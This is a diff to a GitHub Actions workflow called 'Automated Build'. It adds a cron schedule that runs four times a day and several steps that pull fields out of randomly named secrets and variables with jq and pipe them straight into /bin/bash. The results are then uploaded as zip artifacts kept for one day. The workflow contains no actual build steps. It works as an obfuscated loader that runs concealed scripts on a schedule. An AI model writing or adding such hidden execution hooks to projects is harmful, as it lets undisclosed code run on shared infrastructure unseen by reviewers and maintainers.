@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '34 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,15 +17,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          socvf604: ${{ secrets.socvf604 }}
+          qp4: ${{ secrets.qp4 }}
         run: |
-          printf '%s' "$socvf604" | jq -r .tw0 | /bin/bash
-          echo $exw7048 | jq -r .al11 | /bin/bash
+          printf '%s' "$qp4" | jq -r .tbu359 | /bin/bash
+          printf '%s' "$x09" | jq -r .whwps6773 | /bin/bash
+          echo $xb688 | jq -r .hzfou734 | /bin/bash
+          printf '%s' "$iacxb9" | jq -r .k32444 | /bin/bash
+          echo $wcu758 | jq -r .x307 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 7CM0eNL4
+          name: hZB8lXgO
           path: "*.zip"
           retention-days: 1
